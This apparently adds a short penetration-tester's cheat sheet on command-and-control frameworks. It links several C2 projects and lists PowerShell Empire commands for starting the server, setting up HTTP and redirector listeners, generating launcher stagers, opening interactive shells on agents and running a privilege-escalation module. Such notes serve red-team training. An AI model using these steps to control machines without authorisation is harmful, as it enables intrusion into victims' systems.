@@ -1,0 +1,59 @@
+### c2 ###
+https://www.thec2matrix.com/
+
+https://www.cobaltstrike.com/
+https://github.com/cobbr/Covenant
+https://github.com/Ne0nd0g/merlin
+https://github.com/bats3c/shad0w
+https://github.com/nettitude/PoshC2
+
+
+## empire ##
+# server #
+sudo powershell-empire server
+	Default run on > https://localhost:1337 empireadmin / password123
+
+# client #
+powershell-empire client
+uselistener http
+	> options
+	> set OPTION VALUE
+	> set Name CLIHTTP
+	> set Host IP
+	> set Port 8000
+	> execute		#start listener
+	> back			#exit menu
+	> main			#main menu
+
+uselistener http_hop
+	> set RedirectListener CLIHTTP
+	> set Host IP
+	> set Port 33322
+
+listeners			#list listeners
+	> kill NAME
+
+usestager multi/launcher	#good bet
+usestager multi/bash
+	> set listener CLIHTTP
+	> execute
+	> back
+
+agents				#list agents (aka sessions)
+	> interact NAME
+		> help
+		> whoami
+		> back
+		> shell		#interactive shell
+	> rename NAME RENAME
+	> kill NAME
+
+usemodule NAME
+usemodule powershell/privesc/sherlock	#potential privesc
+	> options
+	> set Agent NAME
+	> execute
+
+
+
+
